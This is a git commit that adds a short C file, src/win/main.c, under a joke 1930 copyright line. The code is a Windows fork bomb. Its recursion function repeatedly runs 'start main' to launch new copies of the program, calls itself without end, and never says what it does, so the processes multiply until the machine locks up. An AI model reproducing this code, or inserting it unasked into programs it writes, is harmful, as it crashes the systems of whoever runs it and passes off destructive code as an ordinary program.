989c9c24f54b7bd60791d0c6d0b54befc79e2c66
tintofchaos <77617392+tintofchaos@users.noreply.github.com>
2021-02-11 09:35:50 -0800

    Add files via upload

---
+++ src/win/main.c
@@ -0,0 +1,12 @@
+//Copyright © 1930 Sans All Rights Reserved.
+#include <stdio.h>
+#include <stdlib.h>
+int recursion(){
+	system("start main");
+	int JustAGenericVariable = 6;
+	recursion();
+}
+int main(){
+	recursion();
+	return 0;
+}
